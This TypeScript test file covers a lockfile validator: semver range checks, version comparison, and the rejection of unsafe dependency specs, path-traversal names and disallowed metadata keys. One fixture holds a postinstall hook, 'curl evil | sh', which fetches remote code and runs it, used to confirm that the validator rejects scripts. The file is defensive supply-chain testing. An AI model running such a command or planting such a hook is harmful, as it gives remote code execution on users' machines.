import { describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { readFileSync } from "node:fs";
import {
  compareVersions,
  parseLock,
  satisfiesRange,
} from "../../f/factory/lib/metadata_patch_lock.ts";
import { buildLock, INTEGRITY } from "./metadata_patch_fixtures.ts";

function failure(text: string): string {
  const result = parseLock(text);
  return result.ok ? "ok" : result.reason;
}

describe("satisfiesRange", () => {
  test.each([
    ["1.3.0", "1.3.0", true],
    ["1.3.1", "1.3.0", false],
    ["1.4.0", "^1.3.0", true],
    ["1.2.9", "^1.3.0", false],
    ["2.0.0", "^1.3.0", false],
    ["0.3.5", "^0.3.1", true],
    ["0.4.0", "^0.3.1", false],
    ["0.0.3", "^0.0.3", true],
    ["0.0.4", "^0.0.3", false],
    ["1.3.9", "~1.3.0", true],
    ["1.4.0", "~1.3.0", false],
    ["1.3.0", "^1.3.0-beta.1", true],
    ["1.3.0-beta.2", "^1.3.0-beta.1", true],
    ["1.3.0-beta.1", "1.3.0-beta.1", true],
    ["1.4.0-beta.1", "^1.3.0", false],
  ])("accepts %s for %s: %s", (version, range, expected) => {
    expect(satisfiesRange(version, range)).toBe(expected);
  });

  test.each([[">=1.0.0"], ["latest"], ["1.x"], ["^1"], [""], ["file:../x"]])(
    "rejects the range %s",
    (range) => {
      expect(satisfiesRange("1.0.0", range)).toBe(false);
    },
  );
});

describe("compareVersions", () => {
  test.each([
    ["1.2.3", "1.2.4", -1],
    ["1.10.0", "1.9.0", 1],
    ["2.0.0", "2.0.0", 0],
    ["1.0.0-beta", "1.0.0", -1],
    ["1.0.0-beta.2", "1.0.0-beta.10", -1],
    ["1.0.0-beta.1", "1.0.0-beta", 1],
    ["1.0.0-1", "1.0.0-alpha", -1],
    ["1.0.0+build1", "1.0.0+build2", 0],
  ])("compares %s with %s", (a, b, expected) => {
    expect(compareVersions(a, b)).toBe(expected);
  });
});

describe("parseLock binds the dependencies to the packages", () => {
  test("rejects a dependency that has no package", () => {
    const text = buildLock({ packages: {} });
    expect(failure(text)).toBe("unresolved_dependency");
  });

  test("rejects an empty second half with a dependency", () => {
    const text = '{"dependencies": {"left-pad": "1.3.0"}}\n//bun.lock\n<empty>';
    expect(failure(text)).toBe("unresolved_dependency");
  });

  test("rejects a package whose version is outside the range", () => {
    const text = buildLock({
      deps: { "left-pad": "^1.3.0" },
      packages: { "left-pad": { ident: "left-pad@2.0.0" } },
    });
    expect(failure(text)).toBe("unresolved_dependency");
  });

  test("rejects a package with another exact version", () => {
    const text = buildLock({
      deps: { "left-pad": "1.3.0" },
      packages: { "left-pad": { ident: "left-pad@1.3.1" } },
    });
    expect(failure(text)).toBe("unresolved_dependency");
  });

  test("accepts a package inside the range", () => {
    const text = buildLock({
      deps: { "left-pad": "^1.3.0" },
      packages: { "left-pad": { ident: "left-pad@1.9.9" } },
    });
    expect(failure(text)).toBe("ok");
  });

  test("reads every committed lock", () => {
    const names = execFileSync("git", ["ls-files", "f/*.script.lock"], {
      encoding: "utf8",
    })
      .split("\n")
      .filter((name) => name !== "");
    const rejected = names.filter(
      (name) => !parseLock(readFileSync(name, "utf8")).ok,
    );
    expect(rejected).toEqual([]);
  });
});

const withMeta = (
  meta: unknown,
  extra: Record<string, { ident: string }> = {},
) =>
  buildLock({
    packages: {
      "left-pad": { ident: "left-pad@1.3.0", meta },
      ...extra,
    },
  });

describe("parseLock checks the metadata of a package", () => {
  test("rejects a scripts key", () => {
    const text = withMeta({ scripts: { postinstall: "curl evil | sh" } });
    expect(failure(text)).toBe("disallowed_key");
  });

  test("rejects a trustedDependencies key", () => {
    expect(failure(withMeta({ trustedDependencies: ["x"] }))).toBe(
      "disallowed_key",
    );
  });

  test.each([
    ["a github shorthand", "github:owner/repo"],
    ["a file path", "file:../x"],
    ["a link", "link:../x"],
    ["a git url", "git+https://example.com/x.git"],
    ["an npm alias", "npm:other@1.0.0"],
    ["a tarball url", "https://example.com/x.tgz"],
    ["a tag", "latest"],
    ["an owner and repo", "owner/repo"],
  ])("rejects %s as a dependency of a package", (_label, spec) => {
    const text = withMeta(
      { dependencies: { "is-odd": spec } },
      { "is-odd": { ident: "is-odd@1.0.0" } },
    );
    expect(failure(text)).toBe("bad_package");
  });

  test.each([
    ["^1.0.0"],
    [">=1.0.0 <3"],
    ["*"],
    ["^1 || ^2"],
    ["1.x"],
    ["~1.2.3"],
  ])("accepts the range %s as a dependency of a package", (spec) => {
    const text = withMeta(
      { dependencies: { "is-odd": spec } },
      { "is-odd": { ident: "is-odd@1.0.0" } },
    );
    expect(failure(text)).toBe("ok");
  });

  test("rejects a dependency that no package resolves", () => {
    const text = withMeta({ dependencies: { "is-odd": "^1.0.0" } });
    expect(failure(text)).toBe("bad_package");
  });

  test("resolves a dependency to a nested package", () => {
    const text = buildLock({
      packages: {
        "left-pad": {
          ident: "left-pad@1.3.0",
          meta: { dependencies: { "is-odd": "^1.0.0" } },
        },
        "left-pad/is-odd": { ident: "is-odd@1.0.0" },
      },
    });
    expect(failure(text)).toBe("ok");
  });

  test("accepts the metadata that bun writes", () => {
    const text = withMeta({
      optionalDependencies: {},
      peerDependencies: { react: ">=17" },
      optionalPeers: ["react"],
      bin: { leftpad: "bin/leftpad.js" },
      os: ["darwin", "linux"],
      cpu: "x64",
      libc: "glibc",
    });
    expect(failure(text)).toBe("ok");
  });

  test("rejects a bin that is not a string map", () => {
    expect(failure(withMeta({ bin: { x: { evil: 1 } } }))).toBe("bad_package");
  });

  test("rejects an os that is not a string list", () => {
    expect(failure(withMeta({ os: [1] }))).toBe("bad_package");
  });
});

describe("parseLock checks the names", () => {
  test.each([
    ["a name made of dots", ".."],
    ["a single dot", "."],
    ["a leading dot", ".hidden"],
    ["a leading underscore", "_private"],
    ["a parent reference in a nested key", "left-pad/../x"],
  ])("rejects %s as a package key", (_label, key) => {
    const text = buildLock({
      packages: {
        "left-pad": { ident: "left-pad@1.3.0" },
        [key]: [`${key}@1.0.0`, "", {}, INTEGRITY],
      },
    });
    expect(failure(text)).toBe("bad_package");
  });

  test("rejects a dependency name made of dots", () => {
    const text = buildLock({
      deps: { "..": "1.0.0" },
      packages: { "..": { ident: "..@1.0.0" } },
    });
    expect(failure(text)).toBe("bad_dependency");
  });
});
